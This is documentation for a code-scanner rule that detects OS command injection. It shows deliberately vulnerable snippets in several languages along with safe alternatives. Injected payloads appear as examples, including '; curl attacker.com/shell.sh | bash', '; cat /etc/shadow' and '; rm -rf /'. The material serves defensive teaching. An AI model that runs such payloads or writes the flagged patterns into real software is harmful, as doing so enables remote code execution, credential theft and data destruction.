---
title: "VNX-78 – OS Command Injection"
description: "Detect user-controlled data passed to shell execution functions, enabling attackers to run arbitrary commands on the host operating system."
---

## Overview

This rule flags calls to shell-execution functions — `os.system()`, `subprocess.*` with `shell=True`, `child_process.exec()`, `Runtime.getRuntime().exec()`, PHP's `shell_exec()`, Ruby backtick execution, and others — particularly when user-controlled data appears to flow into the command string. OS command injection gives an attacker the ability to run arbitrary commands on the server with the privileges of the web application process, which frequently leads to full system compromise, data exfiltration, or lateral movement. This maps to [CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html).

**Severity:** Critical | **CWE:** [CWE-78 – OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)

## Why This Matters

Command injection is classified as critical because the attacker's payload is executed by the OS kernel — there is no application-layer sandbox. A single vulnerable endpoint that calls `os.system("ping " + user_host)` lets an attacker append `; cat /etc/shadow`, `; curl attacker.com/shell.sh | bash`, or any other command. Real-world examples include the Shellshock vulnerability in CGI scripts, numerous router firmware exploits, and CI/CD pipeline poisoning attacks. MITRE ATT&CK T1059 covers command and scripting interpreter abuse, which is present in the majority of high-impact intrusions.

The rule flags both unconditionally dangerous functions (`os.system`, `shell_exec`, backtick operators in Ruby, `child_process.exec`) and conditionally dangerous patterns (`subprocess.run` with `shell=True`, `exec()` with dynamic string arguments in Node.js and Go).

## What Gets Flagged

```python
# FLAGGED: os.system with user input
import os
from flask import request

@app.route('/ping')
def ping():
    host = request.args['host']
    os.system('ping -c 1 ' + host)   # attacker sends: 1.1.1.1; rm -rf /
```

```python
# FLAGGED: subprocess with shell=True
import subprocess
from flask import request

@app.route('/lookup')
def lookup():
    domain = request.form['domain']
    subprocess.run('nslookup ' + domain, shell=True)  # shell=True enables injection
```

```javascript
// FLAGGED: child_process.exec with template literal
const { exec } = require('child_process');

app.post('/convert', (req, res) => {
    exec(`ffmpeg -i ${req.body.inputFile} output.mp4`, (err, stdout) => {
        res.send(stdout);
    });
});
```

```php
<?php
// FLAGGED: shell_exec with user input
$domain = $_GET['domain'];
$result = shell_exec('whois ' . $domain);
echo $result;
```

```ruby
# FLAGGED: backtick with user input
def ping(host)
  `ping -c 1 #{host}`  # backtick evaluates through the shell
end
```

```go
// FLAGGED: exec.Command with string concatenation
func handler(w http.ResponseWriter, r *http.Request) {
    input := r.FormValue("file")
    cmd := exec.Command("sh", "-c", "process " + input)
    cmd.Run()
}
```

## Remediation

1. **Avoid shell execution entirely where possible.** Most use cases for `os.system` or `exec()` have safe library alternatives.

```python
# SAFE: Use the icmp library instead of shelling out
import subprocess, shlex

# SAFE: subprocess list form — no shell interpolation, each arg is separate
result = subprocess.run(['ping', '-c', '1', host], capture_output=True, text=True)
# Note: shell=True is ABSENT — the list form is safe even with user input,
# because the OS treats each list element as a literal argument, not shell text.
```

```javascript
// SAFE: execFile instead of exec — arguments are NOT passed through a shell
const { execFile } = require('child_process');

app.post('/convert', (req, res) => {
    const inputFile = req.body.inputFile;
    // Validate the filename first
    if (!/^[\w\-. ]+$/.test(inputFile)) return res.status(400).send('Invalid filename');
    execFile('ffmpeg', ['-i', inputFile, 'output.mp4'], (err, stdout) => {
        res.send(stdout);
    });
});
```

```go
// SAFE: exec.Command with separate argument strings — no shell involved
func handler(w http.ResponseWriter, r *http.Request) {
    input := r.FormValue("file")
    // Validate input against allowlist first
    if !allowedFile(input) {
        http.Error(w, "invalid file", http.StatusBadRequest)
        return
    }
    cmd := exec.Command("process", input)  // each arg is literal, no shell
    cmd.Run()
}
```

2. **Use `shell=False` (Python default) and pass arguments as a list.** Never join user input into a single string and pass it to a shell.

3. **Validate input against a strict allowlist.** If a hostname is expected, validate it matches a hostname regex. If a filename is expected, validate it contains only safe characters before using it in any command.

4. **Drop privileges.** Run the application as a low-privilege user so that command injection cannot immediately access sensitive files or escalate.

## References

- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [OWASP Testing for Command Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection)
- [CAPEC-88: OS Command Injection](https://capec.mitre.org/data/definitions/88.html)
- [MITRE ATT&CK T1059 – Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
